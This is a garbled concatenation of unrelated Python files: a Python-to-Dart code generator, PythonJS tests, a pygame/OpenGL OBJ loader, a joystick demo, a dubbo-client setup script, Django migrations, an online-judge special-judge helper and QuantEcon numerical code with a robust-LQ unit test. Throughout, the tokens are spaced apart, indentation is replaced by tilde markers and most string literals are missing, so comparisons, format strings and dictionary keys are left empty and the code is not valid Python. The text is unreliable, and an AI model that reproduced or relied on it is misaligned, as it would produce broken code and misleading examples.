~~ elif isinstance ( decor , ast . Call ) and isinstance ( decor . func , ast . Name ) and decor . func . id == ~~~ for key in decor . keywords : \n 
~~~ args_typedefs [ key . arg ] = key . value . id \n 
~~ ~~ else : \n 
~~~ raise SyntaxError \n 
\n 
~~ ~~ args = [ ] #self.visit(node.args) \n 
oargs = [ ] \n 
offset = len ( node . args . args ) - len ( node . args . defaults ) \n 
varargs = False \n 
varargs_name = None \n 
for i , arg in enumerate ( node . args . args ) : \n 
~~~ a = arg . id \n 
if a in args_typedefs : \n 
~~~ a = % ( args_typedefs [ a ] , a ) \n 
~~ dindex = i - offset \n 
if a . startswith ( ) : \n 
~~~ varargs_name = a . split ( ) [ - 1 ] \n 
varargs = [ % n for n in range ( 16 ) ] \n 
args . append ( % . join ( varargs ) ) \n 
\n 
~~ elif dindex >= 0 and node . args . defaults : \n 
~~~ default_value = self . visit ( node . args . defaults [ dindex ] ) \n 
oargs . append ( % ( a , default_value ) ) \n 
~~ else : \n 
~~~ args . append ( a ) \n 
\n 
~~ ~~ if oargs : \n 
\n 
~~~ args . append ( % . join ( oargs ) ) \n 
\n 
~~ buffer = self . indent ( ) \n 
if hasattr ( node , ) : buffer += node . _prefix + \n 
\n 
if getter : \n 
~~~ buffer += % node . name \n 
~~ elif setter : \n 
~~~ buffer += % ( node . name , . join ( args ) ) \n 
~~ else : \n 
~~~ buffer += % ( node . name , . join ( args ) ) \n 
~~ self . push ( ) \n 
\n 
if varargs : \n 
~~~ buffer += % varargs_name \n 
for i , n in enumerate ( varargs ) : \n 
~~~ buffer += % ( n , varargs_name , n ) \n 
\n 
~~ ~~ body = list ( ) \n 
for child in node . body : \n 
~~~ if isinstance ( child , ast . Str ) : \n 
~~~ continue \n 
~~ else : \n 
~~~ body . append ( self . indent ( ) + self . visit ( child ) ) \n 
\n 
~~ ~~ buffer += . join ( body ) \n 
self . pull ( ) \n 
buffer += % self . indent ( ) \n 
return buffer \n 
\n 
\n 
~~ def visit_Is ( self , node ) : \n 
~~~ return \n 
\n 
~~ def visit_IsNot ( self , node ) : \n 
~~~ return \n 
\n 
~~ def visit_NotEq ( self , node ) : \n 
~~~ return \n 
\n 
~~ def _visit_call_helper ( self , node ) : \n 
~~~ if node . args : \n 
~~~ args = [ self . visit ( e ) for e in node . args ] \n 
args = . join ( [ e for e in args if e ] ) \n 
~~ else : \n 
~~~ args = \n 
\n 
~~ if isinstance ( node . func , ast . Name ) and node . func . id == and len ( node . args ) == 2 : \n 
~~~ func = \n 
~~ else : \n 
~~~ func = self . visit ( node . func ) \n 
\n 
~~ if node . keywords : \n 
~~~ kwargs = . join ( [ % ( x . arg , self . visit ( x . value ) ) for x in node . keywords ] ) \n 
if args : \n 
~~~ return % ( func , . join ( args ) , kwargs ) \n 
~~ else : \n 
~~~ return % ( func , kwargs ) \n 
\n 
~~ ~~ else : \n 
~~~ return % ( func , args ) \n 
\n 
~~ ~~ def _visit_call_helper_var ( self , node ) : \n 
~~~ args = [ self . visit ( a ) for a in node . args ] \n 
if self . _function_stack : \n 
~~~ fnode = self . _function_stack [ - 1 ] \n 
rem = [ ] \n 
for arg in args : \n 
~~~ if arg in fnode . _local_vars : \n 
~~~ rem . append ( arg ) \n 
~~ else : \n 
~~~ fnode . _local_vars . add ( arg ) \n 
~~ ~~ for arg in rem : \n 
~~~ args . remove ( arg ) \n 
\n 
~~ ~~ out = [ ] \n 
\n 
if args : \n 
~~~ out . append ( + . join ( args ) ) \n 
~~ if node . keywords : \n 
~~~ for key in node . keywords : \n 
~~~ out . append ( % ( key . value . id , key . arg ) ) \n 
\n 
~~ ~~ return . join ( out ) \n 
\n 
~~ def _visit_call_helper_list ( self , node ) : \n 
~~~ name = self . visit ( node . func ) \n 
if node . args : \n 
~~~ args = [ self . visit ( e ) for e in node . args ] \n 
args = . join ( [ e for e in args if e ] ) \n 
~~ else : \n 
~~~ args = ## the dart list builtin requires an argument \n 
~~ return % ( name , args ) \n 
\n 
\n 
~~ def _visit_call_helper_numpy_array ( self , node ) : \n 
~~~ simd = { \n 
: \n 
} \n 
arg_name = args = None \n 
direct = False \n 
if isinstance ( node . args [ 0 ] , ast . Name ) : \n 
~~~ arg_name = node . args [ 0 ] . id \n 
~~ else : \n 
~~~ args = . join ( [ self . visit ( a ) for a in node . args [ 0 ] . elts ] ) \n 
if len ( node . args [ 0 ] . elts ) == 4 : ## simple rule: if there are 4 items, its a direct SIMD type \n 
~~~ direct = True \n 
\n 
~~ ~~ if node . keywords : \n 
~~~ for key in node . keywords : \n 
~~~ if key . arg == : \n 
~~~ if isinstance ( key . value , ast . Attribute ) and key . value . attr in simd : \n 
~~~ if arg_name : \n 
~~~ return % arg_name \n 
~~ elif direct : \n 
~~~ return % ( simd [ key . value . attr ] , args ) \n 
~~ else : \n 
~~~ return % args \n 
~~ ~~ ~~ ~~ ~~ else : \n 
~~~ raise NotImplementedError ( ) \n 
\n 
\n 
~~ ~~ def _visit_call_helper_instanceof ( self , node ) : \n 
~~~ args = map ( self . visit , node . args ) \n 
if len ( args ) == 2 : \n 
~~~ if args [ 1 ] == : \n 
~~~ args [ 1 ] = \n 
~~ return % tuple ( args ) \n 
~~ else : \n 
~~~ raise SyntaxError ( args ) \n 
\n 
~~ ~~ def visit_ExceptHandler ( self , node ) : \n 
~~~ return . join ( [ self . visit ( n ) for n in node . body ] ) \n 
\n 
~~ def visit_Compare ( self , node ) : \n 
~~~ specials = { \n 
: , \n 
: , \n 
: , \n 
: \n 
} \n 
comp = [ ] \n 
if len ( node . ops ) == 0 : \n 
\n 
~~~ comp . append ( ) \n 
comp . append ( self . visit ( node . left ) ) \n 
comp . append ( ) \n 
\n 
~~ else : \n 
~~~ if self . visit ( node . ops [ 0 ] ) in specials : \n 
~~~ pass \n 
~~ else : \n 
~~~ comp . append ( ) \n 
comp . append ( self . visit ( node . left ) ) \n 
comp . append ( ) \n 
\n 
~~ for i in range ( len ( node . ops ) ) : \n 
~~~ op = self . visit ( node . ops [ i ] ) \n 
\n 
if op in specials : \n 
~~~ comp . append ( specials [ op ] + % self . visit ( node . left ) ) \n 
~~ else : \n 
~~~ comp . append ( op ) \n 
\n 
~~ if isinstance ( node . comparators [ i ] , ast . BinOp ) : \n 
~~~ comp . append ( ) \n 
comp . append ( self . visit ( node . comparators [ i ] ) ) \n 
comp . append ( ) \n 
~~ else : \n 
~~~ comp . append ( self . visit ( node . comparators [ i ] ) ) \n 
\n 
~~ if op in specials : \n 
~~~ comp . append ( ) \n 
\n 
\n 
~~ ~~ ~~ return . join ( comp ) \n 
\n 
~~ ~~ def main ( script ) : \n 
~~~ tree = ast . parse ( script ) \n 
return DartGenerator ( ) . visit ( tree ) \n 
\n 
\n 
~~ def command ( ) : \n 
~~~ scripts = [ ] \n 
if len ( sys . argv ) > 1 : \n 
~~~ for arg in sys . argv [ 1 : ] : \n 
~~~ if arg . endswith ( ) : \n 
~~~ scripts . append ( arg ) \n 
\n 
~~ ~~ ~~ if len ( scripts ) : \n 
~~~ a = [ ] \n 
for script in scripts : \n 
~~~ a . append ( open ( script , ) . read ( ) ) \n 
~~ data = . join ( a ) \n 
~~ else : \n 
~~~ data = sys . stdin . read ( ) \n 
\n 
~~ js = main ( data ) \n 
print ( js ) \n 
\n 
\n 
~~ if __name__ == : \n 
~~~ command ( ) \n 
~~ \n 
\n 
from time import time \n 
from time import sleep \n 
import threading \n 
\n 
\n 
def main ( ) : \n 
~~~ if PYTHON == : \n 
~~~ pythonjs . configure ( direct_operator = ) \n 
pass \n 
\n 
\n 
~~ starttime = time ( ) \n 
n = 3000 \n 
seq = [ ] \n 
cache = [ ] \n 
\n 
w1 = threading . start_webworker ( worker , ( 0 , n , seq , cache ) ) \n 
sleep ( 1.0 ) \n 
\n 
testtime = time ( ) - starttime \n 
primes_per_sec = len ( seq ) * ( 1.0 / testtime ) \n 
\n 
print ( primes_per_sec ) \n 
print ( % testtime ) \n 
print ( ) \n 
\n 
\n 
~~ with webworker : \n 
~~~ def worker ( start , end , seq , cache ) : \n 
~~~ print ( ) \n 
for i in range ( start , end ) : \n 
~~~ if i in cache : \n 
#continue  ## TODO - fix continue \n 
~~~ pass \n 
~~ else : \n 
~~~ cache . append ( i ) \n 
if is_prime ( i ) : \n 
~~~ seq . append ( i ) \n 
~~ ~~ ~~ print ( % i ) \n 
\n 
~~ def is_prime ( n ) : \n 
~~~ hits = 0 \n 
for x in range ( 2 , n ) : \n 
~~~ for y in range ( 2 , n ) : \n 
~~~ if x * y == n : \n 
~~~ hits += 1 \n 
if hits > 1 : \n 
~~~ return False \n 
~~ ~~ ~~ ~~ return True \n 
\n 
~~ ~~ """if empty dict then false""" \n 
def main ( ) : \n 
~~~ d = { } \n 
if d : \n 
~~~ err1 = 1 \n 
~~ else : \n 
~~~ err1 = 0 \n 
\n 
~~ if { } : \n 
~~~ err2 = 1 \n 
~~ else : \n 
~~~ err2 = 0 \n 
\n 
~~ d [ ] = \n 
if d : \n 
~~~ err3 = 0 \n 
~~ else : \n 
~~~ err3 = 1 \n 
\n 
~~ TestError ( err1 == 0 ) \n 
TestError ( err2 == 0 ) \n 
TestError ( err3 == 0 ) \n 
~~ """if not""" \n 
\n 
def main ( ) : \n 
~~~ a = False \n 
b = False \n 
if not a : \n 
~~~ b = True \n 
\n 
~~ TestError ( b == True ) \n 
\n 
a = 0 \n 
b = False \n 
if not a : \n 
~~~ b = True \n 
\n 
~~ TestError ( b == True ) \n 
\n 
a = 0.0 \n 
b = False \n 
if not a : \n 
~~~ b = True \n 
\n 
~~ TestError ( b == True ) \n 
\n 
a = None \n 
b = False \n 
if not a : \n 
~~~ b = True \n 
\n 
~~ TestError ( b == True ) \n 
~~ \n 
\n 
def main ( ) : \n 
~~~ a = range ( 10 ) \n 
TestError ( a [ 0 ] == 0 ) \n 
TestError ( a [ 1 ] == 1 ) \n 
TestError ( len ( a ) == 10 ) \n 
\n 
b = range ( 1 , 10 ) \n 
TestError ( b [ 0 ] == 1 ) \n 
TestError ( b [ 1 ] == 2 ) \n 
TestError ( len ( b ) == 9 ) \n 
\n 
c = 0 \n 
for i in range ( 10 ) : \n 
~~~ c += 1 \n 
~~ TestError ( c == 10 ) \n 
\n 
d = 0 \n 
for i in range ( 1 , 10 ) : \n 
~~~ d += 1 \n 
~~ TestError ( d == 9 ) \n 
\n 
e = 0 \n 
for i in range ( 1 , 8 + 2 ) : \n 
~~~ e += 1 \n 
~~ TestError ( e == 9 ) \n 
~~ \n 
\n 
from time import time \n 
from time import sleep \n 
import threading \n 
\n 
\n 
def main ( ) : \n 
~~~ if PYTHON == : \n 
~~~ pythonjs . configure ( direct_operator = ) \n 
pass \n 
~~ else : \n 
~~~ def l ( f , a ) : threading . _start_new_thread ( f , a ) \n 
threading . start_webworker = l \n 
\n 
~~ seq = { } \n 
w1 = threading . start_webworker ( worker , ( seq , , ) ) \n 
w2 = threading . start_webworker ( worker , ( seq , , ) ) \n 
sleep ( 1.0 ) \n 
\n 
\n 
TestError ( in seq ) \n 
TestError ( in seq ) \n 
print ( ) \n 
print ( seq ) \n 
\n 
~~ if PYTHON != : \n 
~~~ class webworker ( object ) : \n 
~~~ def __enter__ ( self , * args ) : pass \n 
def __exit__ ( self , * args ) : pass \n 
~~ webworker = webworker ( ) \n 
\n 
~~ with webworker : \n 
~~~ def worker ( seq , s , break_on ) : \n 
~~~ print ( ) \n 
for char in s : \n 
~~~ seq [ char ] = True \n 
if break_on in seq : \n 
~~~ break \n 
#while break_on not in seq: \n 
\n 
~~ ~~ sleep ( 0.1 ) # this sleep is not required in normal CPython \n 
\n 
print ( ) \n 
print ( seq ) \n 
\n 
\n 
~~ ~~ from OpenGL . GL import * \n 
from OpenGL . GLU import * \n 
\n 
import pygame \n 
import os . path \n 
\n 
class Material ( object ) : \n 
\n 
~~~ def __init__ ( self ) : \n 
\n 
~~~ self . name = "" \n 
self . texture_fname = None \n 
self . texture_id = None \n 
\n 
\n 
~~ ~~ class FaceGroup ( object ) : \n 
\n 
~~~ def __init__ ( self ) : \n 
\n 
~~~ self . tri_indices = [ ] \n 
self . material_name = "" \n 
\n 
\n 
~~ ~~ class Model3D ( object ) : \n 
\n 
~~~ def __init__ ( self ) : \n 
\n 
~~~ self . vertices = [ ] \n 
self . tex_coords = [ ] \n 
self . normals = [ ] \n 
self . materials = { } \n 
self . face_groups = [ ] \n 
self . display_list_id = None \n 
\n 
~~ def __del__ ( self ) : \n 
\n 
#Called when the model is cleaned up by Python \n 
~~~ self . free_resources ( ) \n 
\n 
~~ def free_resources ( self ) : \n 
\n 
# Delete the display list and textures \n 
~~~ if self . display_list_id is not None : \n 
~~~ glDeleteLists ( self . display_list_id , 1 ) \n 
self . display_list_id = None \n 
\n 
# Delete any textures we used \n 
~~ for material in self . materials . values ( ) : \n 
~~~ if material . texture_id is not None : \n 
~~~ glDeleteTextures ( material . texture_id ) \n 
\n 
# Clear all the materials \n 
~~ ~~ self . materials . clear ( ) \n 
\n 
# Clear the geometry lists \n 
del self . vertices [ : ] \n 
del self . tex_coords [ : ] \n 
del self . normals [ : ] \n 
del self . face_groups [ : ] \n 
\n 
\n 
\n 
~~ def read_obj ( self , fname ) : \n 
\n 
~~~ current_face_group = None \n 
\n 
file_in = open ( fname ) \n 
\n 
for line in file_in : \n 
\n 
# Parse command and data from each line \n 
~~~ words = line . split ( ) \n 
command = words [ 0 ] \n 
data = words [ 1 : ] \n 
\n 
if command == : # Material library \n 
\n 
~~~ model_path = os . path . split ( fname ) [ 0 ] \n 
mtllib_path = os . path . join ( model_path , data [ 0 ] ) \n 
self . read_mtllib ( mtllib_path ) \n 
\n 
~~ elif command == : # Vertex \n 
~~~ x , y , z = data \n 
vertex = ( float ( x ) , float ( y ) , float ( z ) ) \n 
self . vertices . append ( vertex ) \n 
\n 
~~ elif command == : # Texture coordinate \n 
\n 
~~~ s , t = data \n 
tex_coord = ( float ( s ) , float ( t ) ) \n 
self . tex_coords . append ( tex_coord ) \n 
\n 
~~ elif command == : # Normal \n 
\n 
~~~ x , y , z = data \n 
normal = ( float ( x ) , float ( y ) , float ( z ) ) \n 
self . normals . append ( normal ) \n 
\n 
~~ elif command == : # Use material \n 
\n 
~~~ current_face_group = FaceGroup ( ) \n 
current_face_group . material_name = data [ 0 ] \n 
self . face_groups . append ( current_face_group ) \n 
\n 
~~ elif command == : \n 
\n 
~~~ assert len ( data ) == 3 , "Sorry, only triangles are supported" \n 
\n 
# Parse indices from triples \n 
for word in data : \n 
~~~ vi , ti , ni = word . split ( ) \n 
indices = ( int ( vi ) - 1 , int ( ti ) - 1 , int ( ni ) - 1 ) \n 
current_face_group . tri_indices . append ( indices ) \n 
\n 
\n 
~~ ~~ ~~ for material in self . materials . values ( ) : \n 
\n 
~~~ model_path = os . path . split ( fname ) [ 0 ] \n 
texture_path = os . path . join ( model_path , material . texture_fname ) \n 
texture_surface = pygame . image . load ( texture_path ) \n 
texture_data = pygame . image . tostring ( texture_surface , , True ) \n 
\n 
material . texture_id = glGenTextures ( 1 ) \n 
glBindTexture ( GL_TEXTURE_2D , material . texture_id ) \n 
\n 
glTexParameteri ( GL_TEXTURE_2D , \n 
GL_TEXTURE_MAG_FILTER , \n 
GL_LINEAR ) \n 
glTexParameteri ( GL_TEXTURE_2D , \n 
GL_TEXTURE_MIN_FILTER , \n 
GL_LINEAR_MIPMAP_LINEAR ) \n 
\n 
glPixelStorei ( GL_UNPACK_ALIGNMENT , 1 ) \n 
width , height = texture_surface . get_rect ( ) . size \n 
gluBuild2DMipmaps ( GL_TEXTURE_2D , \n 
3 , \n 
width , \n 
height , \n 
GL_RGB , \n 
GL_UNSIGNED_BYTE , \n 
texture_data ) \n 
\n 
\n 
~~ ~~ def read_mtllib ( self , mtl_fname ) : \n 
\n 
~~~ file_mtllib = open ( mtl_fname ) \n 
for line in file_mtllib : \n 
\n 
~~~ words = line . split ( ) \n 
command = words [ 0 ] \n 
data = words [ 1 : ] \n 
\n 
if command == : \n 
~~~ material = Material ( ) \n 
material . name = data [ 0 ] \n 
self . materials [ data [ 0 ] ] = material \n 
\n 
~~ elif command == : \n 
~~~ material . texture_fname = data [ 0 ] \n 
\n 
\n 
~~ ~~ ~~ def draw ( self ) : \n 
\n 
~~~ vertices = self . vertices \n 
tex_coords = self . tex_coords \n 
normals = self . normals \n 
\n 
for face_group in self . face_groups : \n 
\n 
~~~ material = self . materials [ face_group . material_name ] \n 
glBindTexture ( GL_TEXTURE_2D , material . texture_id ) \n 
\n 
glBegin ( GL_TRIANGLES ) \n 
for vi , ti , ni in face_group . tri_indices : \n 
~~~ glTexCoord2fv ( tex_coords [ ti ] ) \n 
glNormal3fv ( normals [ ni ] ) \n 
glVertex3fv ( vertices [ vi ] ) \n 
~~ glEnd ( ) \n 
\n 
\n 
~~ ~~ def draw_quick ( self ) : \n 
\n 
~~~ if self . display_list_id is None : \n 
~~~ self . display_list_id = glGenLists ( 1 ) \n 
glNewList ( self . display_list_id , GL_COMPILE ) \n 
self . draw ( ) \n 
glEndList ( ) \n 
\n 
~~ glCallList ( self . display_list_id ) \n 
~~ ~~ def saturate_color ( color ) : \n 
~~~ red , green , blue = color \n 
red = min ( red , 255 ) \n 
green = min ( green , 255 ) \n 
blue = min ( blue , 255 ) \n 
return red , green , blue \n 
~~ import pygame \n 
from pygame . locals import * \n 
from sys import exit \n 
from gameobjects . vector2 import Vector2 \n 
\n 
picture_file = \n 
\n 
pygame . init ( ) \n 
screen = pygame . display . set_mode ( ( 640 , 480 ) , 0 , 32 ) \n 
\n 
picture = pygame . image . load ( picture_file ) . convert ( ) \n 
picture_pos = Vector2 ( 0 , 0 ) \n 
scroll_speed = 1000. \n 
\n 
clock = pygame . time . Clock ( ) \n 
\n 
joystick = None \n 
if pygame . joystick . get_count ( ) > 0 : \n 
~~~ joystick = pygame . joystick . Joystick ( 0 ) \n 
joystick . init ( ) \n 
\n 
~~ if joystick is None : \n 
~~~ print ( "Sorry, you need a joystick for this!" ) \n 
pygame . quit ( ) \n 
exit ( ) \n 
\n 
\n 
~~ while True : \n 
\n 
~~~ for event in pygame . event . get ( ) : \n 
~~~ if event . type == QUIT : \n 
~~~ pygame . quit ( ) \n 
exit ( ) \n 
\n 
~~ ~~ scroll_direction = Vector2 ( * joystick . get_hat ( 0 ) ) \n 
scroll_direction . normalize ( ) \n 
\n 
screen . fill ( ( 255 , 255 , 255 ) ) \n 
screen . blit ( picture , ( - picture_pos . x , picture_pos . y ) ) \n 
\n 
time_passed = clock . tick ( ) \n 
time_passed_seconds = time_passed / 1000.0 \n 
\n 
picture_pos += scroll_direction * scroll_speed * time_passed_seconds \n 
\n 
pygame . display . update ( ) \n 
~~ __all__ = [ \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
\n 
] \n 
\n 
\n 
__version__ = "0.0.3" \n 
#!/usr/bin/env python \n 
# coding: utf-8 \n 
"""\nPython Dubbo Library Client Server - Setup\n \nCreated\n    2015-4-10 by Joe - https://github.com/JoeCao\n""" \n 
\n 
import os \n 
\n 
from setuptools import setup , find_packages \n 
\n 
THISDIR = os . path . dirname ( os . path . abspath ( __file__ ) ) \n 
os . chdir ( THISDIR ) \n 
\n 
VERSION = open ( "version.txt" ) . readline ( ) . strip ( ) \n 
HOMEPAGE = "https://github.com/ofpay/dubbo-client-py" \n 
DOWNLOAD_BASEURL = "https://github.com/ofpay/dubbo-client-py/raw/master/dist/" \n 
DOWNLOAD_URL = DOWNLOAD_BASEURL + "dubbo-client-%s-py2.7.egg" % VERSION \n 
\n 
setup ( \n 
name = "dubbo-client" , \n 
version = VERSION , \n 
description = ( \n 
"Python Dubbo Client" \n 
) , \n 
long_description = open ( "README.md" ) . read ( ) , \n 
keywords = ( \n 
"Dubbo, JSON-RPC, JSON, RPC, Client," \n 
"HTTP-Client, Remote Procedure Call, JavaScript Object Notation, " \n 
) , \n 
author = "Joe Cao" , \n 
author_email = "chinalibra@gmail.com" , \n 
url = HOMEPAGE , \n 
download_url = DOWNLOAD_URL , \n 
packages = find_packages ( ) , \n 
classifiers = [ \n 
# "Development Status :: 1 - Planning", \n 
# "Development Status :: 2 - Pre-Alpha", \n 
# "Development Status :: 3 - Alpha", \n 
"Development Status :: 4 - Beta" , \n 
# "Development Status :: 5 - Production/Stable", \n 
"Environment :: Web Environment" , \n 
"Intended Audience :: Developers" , \n 
"License :: OSI Approved :: MIT License" , \n 
"Operating System :: OS Independent" , \n 
"Programming Language :: Python :: 2" , \n 
"Topic :: Software Development :: Libraries :: Python Modules" , \n 
"Topic :: Communications" , \n 
"Topic :: System :: Networking" , \n 
"Topic :: Internet :: WWW/HTTP" , \n 
"Topic :: Internet :: WWW/HTTP :: HTTP Servers" , \n 
"Topic :: Internet :: WWW/HTTP :: WSGI :: Application" , \n 
] , \n 
install_requires = [ "kazoo>=2.0" , "python-jsonrpc>=0.7.3" ] , \n 
) \n 
# -*- coding: utf-8 -*- \n 
# Generated by Django 1.9.4 on 2016-03-26 16:39 \n 
from __future__ import unicode_literals \n 
\n 
from django . db import migrations , models \n 
\n 
\n 
class Migration ( migrations . Migration ) : \n 
\n 
~~~ dependencies = [ \n 
( , ) , \n 
] \n 
\n 
operations = [ \n 
migrations . AddField ( \n 
model_name = , \n 
name = , \n 
field = models . BooleanField ( default = False ) , \n 
) , \n 
] \n 
# -*- coding: utf-8 -*- \n 
~~ from __future__ import unicode_literals \n 
\n 
from django . db import models , migrations \n 
from django . conf import settings \n 
import utils . models \n 
\n 
\n 
class Migration ( migrations . Migration ) : \n 
\n 
~~~ dependencies = [ \n 
migrations . swappable_dependency ( settings . AUTH_USER_MODEL ) , \n 
( , ) , \n 
] \n 
\n 
operations = [ \n 
migrations . CreateModel ( \n 
name = , \n 
fields = [ \n 
( , models . AutoField ( verbose_name = , serialize = False , auto_created = True , primary_key ( , models . IntegerField ( default = 0 ) ) , \n 
( , models . IntegerField ( default = 0 ) ) , \n 
( , models . IntegerField ( default = 0 ) ) , \n 
( , utils . models . JsonField ( default = { } ) ) , \n 
( , models . ForeignKey ( to = ) ) , \n 
( , models . ForeignKey ( to = settings . AUTH_USER_MODEL ) ) , \n 
] , \n 
) , \n 
] \n 
# coding=utf-8 \n 
~~ import os \n 
import judger \n 
\n 
WA = 1 \n 
AC = 0 \n 
SPJ_ERROR = - 1 \n 
\n 
\n 
def file_exists ( path ) : \n 
~~~ return os . path . exists ( path ) \n 
\n 
\n 
~~ def spj ( path , max_cpu_time , max_memory , in_path , user_out_path ) : \n 
~~~ if file_exists ( in_path ) and file_exists ( user_out_path ) : \n 
~~~ result = judger . run ( path = path , in_file = in_path , out_file = "/tmp/spj.out" , \n 
max_cpu_time = max_cpu_time , max_memory = max_memory , \n 
args = [ in_path , user_out_path ] , env = [ "PATH=" + os . environ . get ( "PATH" , "" ) use_sandbox = True , use_nobody = True ) \n 
if result [ "signal" ] == 0 and result [ "exit_status" ] in [ AC , WA , SPJ_ERROR ] : \n 
~~~ result [ "spj_result" ] = result [ "exit_status" ] \n 
~~ else : \n 
~~~ result [ "spj_result" ] = SPJ_ERROR \n 
~~ return result \n 
~~ else : \n 
~~~ raise ValueError ( "in_path or user_out_path does not exist" ) # -*- coding: utf-8 -*- \n 
~~ ~~ from __future__ import unicode_literals \n 
\n 
from django . db import models , migrations \n 
\n 
\n 
class Migration ( migrations . Migration ) : \n 
\n 
~~~ dependencies = [ \n 
( , ) , \n 
] \n 
\n 
operations = [ \n 
migrations . RemoveField ( \n 
model_name = , \n 
name = , \n 
) , \n 
] \n 
# coding=utf-8 \n 
~~ from django . http import HttpResponse \n 
\n 
from utils . captcha import Captcha \n 
\n 
\n 
def show_captcha ( request ) : \n 
~~~ return HttpResponse ( Captcha ( request ) . display ( ) , content_type = "image/gif" ) \n 
~~ """\nFilename: compute_fp.py\nAuthors: Thomas Sargent, John Stachurski\n\nCompute the fixed point of a given operator T, starting from\nspecified initial condition v.\n\n""" \n 
import time \n 
import numpy as np \n 
\n 
\n 
def _print_after_skip ( skip , it = None , dist = None , etime = None ) : \n 
~~~ if it is None : \n 
# print initial header \n 
~~~ msg = "{i:<13}{d:<15}{t:<17}" . format ( i = "Iteration" , \n 
d = "Distance" , \n 
t = "Elapsed (seconds)" ) \n 
print ( msg ) \n 
print ( "-" * len ( msg ) ) \n 
\n 
return \n 
\n 
~~ if it % skip == 0 : \n 
~~~ if etime is None : \n 
~~~ print ( "After {it} iterations dist is {d}" . format ( it = it , d = dist ) ) \n 
\n 
~~ else : \n 
# leave 4 spaces between columns if we have %3.3e in d, t \n 
~~~ msg = "{i:<13}{d:<15.3e}{t:<18.3e}" \n 
print ( msg . format ( i = it , d = dist , t = etime ) ) \n 
\n 
~~ ~~ return \n 
\n 
\n 
~~ def compute_fixed_point ( T , v , error_tol = 1e-3 , max_iter = 50 , verbose = 1 , \n 
print_skip = 5 , * args , ** kwargs ) : \n 
~~~ """\n    Computes and returns :math:`T^k v`, an approximate fixed point.\n\n    Here T is an operator, v is an initial condition and k is the number\n    of iterates. Provided that T is a contraction mapping or similar,\n    :math:`T^k v` will be an approximation to the fixed point.\n\n    Parameters\n    ----------\n    T : callable\n        A callable object (e.g., function) that acts on v\n    v : object\n        An object such that T(v) is defined\n    error_tol : scalar(float), optional(default=1e-3)\n        Error tolerance\n    max_iter : scalar(int), optional(default=50)\n        Maximum number of iterations\n    verbose : bool, optional(default=True)\n        If True then print current error at each iterate.\n    args, kwargs :\n        Other arguments and keyword arguments that are passed directly\n        to  the function T each time it is called\n\n    Returns\n    -------\n    v : object\n        The approximate fixed point\n\n    """ \n 
iterate = 0 \n 
error = error_tol + 1 \n 
\n 
if verbose : \n 
~~~ start_time = time . time ( ) \n 
_print_after_skip ( print_skip , it = None ) \n 
\n 
~~ while iterate < max_iter and error > error_tol : \n 
~~~ new_v = T ( v , * args , ** kwargs ) \n 
iterate += 1 \n 
error = np . max ( np . abs ( new_v - v ) ) \n 
\n 
if verbose : \n 
~~~ etime = time . time ( ) - start_time \n 
_print_after_skip ( print_skip , iterate , error , etime ) \n 
\n 
~~ try : \n 
~~~ v [ : ] = new_v \n 
~~ except TypeError : \n 
~~~ v = new_v \n 
~~ ~~ return v \n 
~~ raise ImportError ( "The code previously contained in the quantecon.models subpackage has been migrated to the QuantEcon.applications (https://github.com/QuantEcon/QuantEcon.applications) repo" """\nAuthor: Chase Coleman\nFilename: test_lqcontrol\n\nTests for lqcontrol.py file\n\n""" \n 
import sys \n 
import os \n 
import unittest \n 
import numpy as np \n 
from scipy . linalg import LinAlgError \n 
from numpy . testing import assert_allclose \n 
from quantecon . lqcontrol import LQ \n 
from quantecon . robustlq import RBLQ \n 
\n 
\n 
class TestRBLQControl ( unittest . TestCase ) : \n 
\n 
~~~ def setUp ( self ) : \n 
# Initial Values \n 
~~~ a_0 = 100 \n 
a_1 = 0.5 \n 
rho = 0.9 \n 
sigma_d = 0.05 \n 
beta = 0.95 \n 
c = 2 \n 
gamma = 50.0 \n 
theta = 0.002 \n 
ac = ( a_0 - c ) / 2.0 \n 
\n 
R = np . array ( [ [ 0 , ac , 0 ] , \n 
[ ac , - a_1 , 0.5 ] , \n 
[ 0. , 0.5 , 0 ] ] ) \n 
\n 
R = - R \n 
Q = gamma / 2 \n 
\n 
A = np . array ( [ [ 1. , 0. , 0. ] , \n 
[ 0. , 1. , 0. ] , \n 
[ 0. , 0. , rho ] ] ) \n 
B = np . array ( [ [ 0. ] , \n 
[ 1. ] , \n 
[ 0. ] ] ) \n 
C = np . array ( [ [ 0. ] , \n 
[ 0. ] , \n 
[ sigma_d ] ] ) \n 
\n 
\n 
self . rblq_test = RBLQ ( Q , R , A , B , C , beta , theta ) \n 
self . lq_test = LQ ( Q , R , A , B , C , beta ) \n 
\n 
self . Fr , self . Kr , self . Pr = self . rblq_test . robust_rule ( ) \n 
\n 
~~ def tearDown ( self ) : \n 
~~~ del self . rblq_test \n 
\n 
~~ def test_robust_rule_vs_simple ( self ) : \n 
~~~ rblq = self . rblq_test \n 
Fr , Kr , Pr = self . Fr , self . Kr , self . Pr \n 
\n 
Fs , Ks , Ps = rblq . robust_rule_simple ( P_init = Pr , tol = 1e-12 ) \n 
\n 
assert_allclose ( Fr , Fs , rtol = 1e-4 ) \n 
assert_allclose ( Kr , Ks , rtol = 1e-4 ) \n 
assert_allclose ( Pr , Ps , rtol = 1e-4 ) \n 
\n 
~~ def test_f2k_and_k2f ( self ) : \n 
~~~ rblq = self . rblq_test \n 
Fr , Kr , Pr = self . Fr , self . Kr , self . Pr \n 
\n 
K_f2k , P_f2k = rblq . F_to_K ( Fr ) \n 
F_k2f , P_k2f = rblq . K_to_F ( Kr ) \n 
\n 
assert_allclose ( K_f2k , Kr , rtol = 1e-4 ) \n 
assert_allclose ( F_k2f , Fr , rtol = 1e-4 ) \n 
assert_allclose ( P_f2k , P_k2f , rtol = 1e-4 ) \n 
\n 
~~ def test_evaluate_F ( self ) : \n 
~~~ rblq = self . rblq_test \n 
Fr , Kr , Pr = self . Fr , self . Kr , self . Pr \n 
\n 
Kf , Pf , df , Of , of = rblq . evaluate_F ( Fr ) \n 
\n 
# In the future if we wanted, we could check more things, but I \n 
# think the other pieces are basically just plugging these into \n 
# equations so if these hold then the others should be correct \n 
# as well. \n 
assert_allclose ( Pf , Pr ) \n 
assert_allclose ( Kf , Kr ) \n 
\n 
\n 
\n 
\n 
\n 
\n 
\n 
\n 
~~ ~~ if __name__ == : \n 
~~~ suite = unittest . TestLoader ( ) . loadTestsFromTestCase ( TestRBLQControl ) \n 
unittest . TextTestRunner ( verbosity = 2 , stream = sys . stderr ) . run ( suite ) \n 
